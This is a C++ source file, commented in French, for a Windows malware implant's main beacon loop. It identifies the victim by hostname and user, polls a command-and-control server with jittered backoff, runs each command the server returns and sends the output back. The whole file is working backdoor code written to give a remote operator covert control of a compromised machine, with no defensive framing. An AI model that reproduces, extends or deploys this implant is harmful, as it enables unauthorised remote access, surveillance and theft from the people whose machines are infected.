#include "beacon.h"
#include "network.h"
#include "commands.h"
#include "config.h"
#include <windows.h>
#include <chrono>
#include <iostream>
#include <random>
#include <string>
#include <thread>

namespace {

std::mt19937& rng() {
	static std::mt19937 generator(std::random_device{}());
	return generator;
}

// Identifiant d'agent : "MACHINE\utilisateur", pour que deux implants ne
// partagent pas la même file de commandes côté contrôleur.
std::string detect_agent_id() {
	char host[MAX_COMPUTERNAME_LENGTH + 1] = {};
	DWORD host_size = sizeof(host);

	char user[256] = {};
	DWORD user_size = sizeof(user);

	const bool has_host = GetComputerNameA(host, &host_size) != 0;
	const bool has_user = GetUserNameA(user, &user_size) != 0;

	if (!has_host) {
		return FallbackAgentId;
	}

	std::string agent_id = host;
	if (has_user && user[0] != '\0') {
		agent_id += '\\';
		agent_id += user;
	}
	return agent_id;
}

// Attente entre deux tentatives : exponentielle puis plafonnée, avec un
// jitter pour éviter que plusieurs agents ne reviennent en même temps.
int backoff_delay_ms(int step) {
	std::uniform_int_distribution<int> percent(100 - BackoffJitterPct,
		100 + BackoffJitterPct);
	const int clamped = step < BackoffSteps ? step : BackoffSteps - 1;
	return BackoffMs[clamped] * percent(rng()) / 100;
}

void sleep_ms(int delay) {
	std::this_thread::sleep_for(std::chrono::milliseconds(delay));
}

}  // namespace

void start_implant() {
	const std::string agent_id = detect_agent_id();

	// Résultat de la commande précédente, envoyé au prochain beacon.
	std::string pending_output;
	int failures = 0;

	while (true) {
		const BeaconReply reply = send_beacon(agent_id, pending_output);

		if (reply.result != SendResult::Ok) {
			const int delay = backoff_delay_ms(failures);
			++failures;

			const char* kind = reply.result == SendResult::HttpError
				? "HTTP" : "réseau";
			std::cerr << "échec " << kind << " (" << reply.error << "), "
				<< "nouvelle tentative dans " << delay / 1000 << " s"
				<< " [tentative " << failures << "]" << std::endl;

			sleep_ms(delay);
			continue;
		}

		failures = 0;
		pending_output.clear();

		if (!reply.body.empty()) {
			pending_output = execute_command(reply.body);
		}
	}
}
